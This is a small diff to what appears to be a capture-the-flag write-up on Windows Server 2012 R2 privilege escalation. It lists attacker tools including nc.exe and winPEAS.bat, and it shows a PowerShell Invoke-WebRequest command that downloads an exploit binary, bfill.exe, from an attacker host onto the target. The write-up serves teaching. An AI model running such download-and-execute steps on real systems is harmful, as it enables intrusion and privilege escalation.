@@ -372,7 +372,9 @@ Resorting to Google, I searched for "Windows 2012 R2 privilege" and found quite 
 bfill.exe  nc.exe  winPEAS.bat
 ```
 
-Download bfill.exe with `Invoke-WebRequest` and run it.
+Download bfill.exe with `Invoke-WebRequest`.
+
+```
 
 C:\Users\kostas\Desktop>cd %TEMP%
 C:\Users\kostas\AppData\Local\Temp>powershell.exe -c "Invoke-WebRequest -Uri http://10.10.14.10:80/bfill.exe -OutFile bfill.exe"
